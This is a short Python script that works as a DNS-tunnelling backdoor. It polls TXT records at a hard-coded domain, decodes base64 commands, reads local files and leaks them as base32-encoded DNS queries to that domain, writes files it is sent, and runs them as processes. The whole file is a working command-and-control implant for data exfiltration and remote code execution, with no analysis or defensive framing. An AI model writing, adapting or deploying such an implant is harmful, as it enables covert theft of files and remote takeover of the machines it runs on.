import dns.resolver
import re
import base64
import subprocess

rootServer = "ims20.com"

def readFile(path):
  with(open(path, 'r')) as file:
    #Clasic file reading
    data = file.read();
    dataBytes = data.encode("utf-8")
    #Encode the content using base32
    b32bytes = base64.b32encode(dataBytes)
    encodedFile = b32bytes.decode("utf-8")
    try:
      #Query <base32>.ims20.com for A record --> Wildcard
      #We can explicitly search for those A queries in the log
      dns.resolver.query((encodedFile+".ims20.com"), "A")
    except:
      #Just in case i fuck the DNS server up
      pass

#Creating a file with payload
def createFile(name, contents):
  with open(name, 'w') as file:
    file.write(contents)

#Launch subprocess to run a script
def runFile(name):
  try:
    subprocess.call(name)
  except:
    pass
    
    
#Query specific server and interpret commands   
def askDns(server):
  if ".ims20.com" in server == False:
    pass
  #Always look for the TXT records
  response = dns.resolver.query(server, "TXT").response.answer[0].to_text()
  #We get the response in a specific format. Look for data wrapped in ""
  txt = re.findall(r'"(.*?)"',response)[0]
  #Our commands are always base64 encoded
  decodedCommand = base64.b64decode(txt).decode("utf-8")
  #Actual command is wrapped with {}
  allCommands = re.findall(r'{(.*?)}',decodedCommand)
  #Check our known commands
  for command in allCommands:
    if "read" in command:
      #Read and exfiltrate
      readFile(command.split(" ")[1])
    if "ask" in command:
      #Hook back and ask for record
      askDns(command.split(" ")[1])
    if "create" in command:
      #[1] -> name [3] -> payload
      parts = command.split(" ")
      createFile(parts[1], parts[3])
    if "run" in command:
      #Execute instructed file
      runFile(command.split(" ")[1])

#Root Hook
askDns("cc.ims20.com")
